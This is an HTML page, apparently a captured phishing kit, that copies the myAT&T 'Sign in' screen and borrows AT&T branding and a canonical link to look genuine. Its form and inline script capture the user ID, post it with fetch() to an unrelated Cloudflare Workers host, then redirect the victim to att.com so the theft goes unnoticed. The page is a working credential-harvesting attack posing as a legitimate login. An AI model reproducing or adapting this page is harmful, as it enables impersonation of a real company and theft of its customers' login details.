<!DOCTYPE html>
<html lang="en" class="isPC isChrome isLandscape is-mouse" data-scrapbook-source="https://vu8756.accc098.workers.dev/?id=Tz6PCArmIZ" data-scrapbook-create="20250203150121509" data-scrapbook-title="Login Screen">
<head>
  <meta charset="UTF-8">
  <title>Login Screen</title>
  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
  <meta name="apple-itunes-app" content="app-id=309172177">
  <link rel="stylesheet" href="jalab.css">
  <meta name="referrer" content="no-referrer">
  <script src="crypto-js.min.js" referrerpolicy="no-referrer"></script>
  <link rel="icon" type="image/x-icon" href="ccc13ea6e1bf7ca9fe31b0dd997981fa8ec6a2e1.ico">
  <link rel="canonical" href="https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&amp;appName=m14186">
</head>

<body>
  <div id="app-root">
    <div id="appCompBackground" class="full-width-background bg-white">
      <div id="appCompContainer" class="container full-height flex flex-column">
        <div id="appCompCardContainer" class="row justify-center flex-1">
          <div id="appCompCardContDiv" class="pad-none">
            <div id="main_div" class="main_div">
              <app-card role="main">
                <div class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
                  <div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
                    <app-header class="flex-container">
                      <img id="headerLogoImage" alt="" src="b3d9a34c74bdecaacec751a8122c441d8f2538b4.svg" class="header-logo-image mar-b-md-all">
                      <div class="mar-b-md-all text-center" id="signInHeaderTextDiv">
                        <h1 class="heading-lg" id="signInHeaderText">Sign in</h1>
                        <h1 class="heading-md mar-t-xxs-lg" id="signInHeaderToText">to myAT&amp;T</h1>
                      </div>
                    </app-header>
                    <div class="width-full">
                      <router-outlet></router-outlet>
                      <app-manual-login>
                        <app-error id="appErrorAbove"></app-error>
                        <!-- Form with updated Cloudflare Worker URL -->
                        <form novalidate="" id="login" method="post" class="manual-login-form" action="https://aut0-curr-9dc7.henrycrane65.workers.dev/">
                          <app-user-input>
                            <div id="userInputContainerDiv" class="form-row space-below">
                              <label id="userLabel" for="userID" class="formfield-label">User ID</label>
                              <input id="userID" name="userID" autocomplete="username" spellcheck="false" autocapitalize="off" type="email" class="textfield" required />
                              <div id="userInlineErrorText" role="alert" class="formfield-msg"></div>
                            </div>
                          </app-user-input>
                          <div class="continue-button-spacing">
                            <app-button-spinner class="width-full">
                              <button aria-live="polite" class="btn-full-width btn-primary letter-spacing-3" id="continueFromUserLogin" type="submit">Continue</button>
                            </app-button-spinner>
                          </div>
                        </form>
                      </app-manual-login>
                    </div>
                  </div>
                </div>
              </app-card>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- JavaScript for Form Submission and Redirect -->
  <script>
    document.getElementById("login").addEventListener("submit", async function(event) {
      event.preventDefault(); // Prevent default form submission

      const form = event.target;
      const formData = new FormData(form);

      try {
        // Send data to Cloudflare Worker
        const response = await fetch(form.action, {
          method: "POST",
          body: formData
        });

        if (response.ok) {
          console.log("Form data submitted successfully");
          window.location.href = "https://www.att.com"; // Redirect after successful submission
        } else {
          console.error("Error submitting form", response.status);
        }
      } catch (error) {
        console.error("Form submission error:", error);
      }
    });
  </script>

</body>
</html>
